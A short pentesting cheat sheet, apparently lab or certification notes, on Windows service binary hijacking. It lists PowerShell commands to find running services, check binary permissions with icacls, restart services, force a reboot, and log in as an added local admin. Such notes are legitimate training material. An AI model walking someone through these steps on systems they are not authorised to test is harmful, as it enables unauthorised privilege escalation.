# Service Binary Hijacking

Services with insecure binary permissions can be replaced with malicious executables.

### Find Running Services (Requires RDP)

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}
# OR
Get-CimInstance -ClassName win32_service -Filter "State='Running'" | Select Name,State,PathName,StartName
```

> Services outside `C:\Windows\system32\` are potentially user-installed and more likely vulnerable.

> `Get-CimInstance` and `Get-Service` may return "permission denied" over WinRM/bind shells — use RDP/interactive logon instead.

#### Find Running Services with PowerShell

```powershell
﻿﻿﻿Get-Process | Where-Object {$_.Name -like "*program*"} | Select-Object Name, Id, UserName, StartTime
```

#### Check Permissions

```powershell
icacls <path>    # F=Full, M=Modify, RX=Read+Execute, R=Read, W=Write
```

### **Start & Stop services and Reboot**

```bash
net stop mysqld
net start mysqld
```

**Check startup type + reboot if Automatic:**

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
# If Automatic + SeShutdownPrivilege:
shutdown /r /t 0
```

**After adding a local admin user — gain full privileges:**

```cmd
runas /profile /user:misthos cmd.exe
```

Or RDP / sign-out and login as the new user.

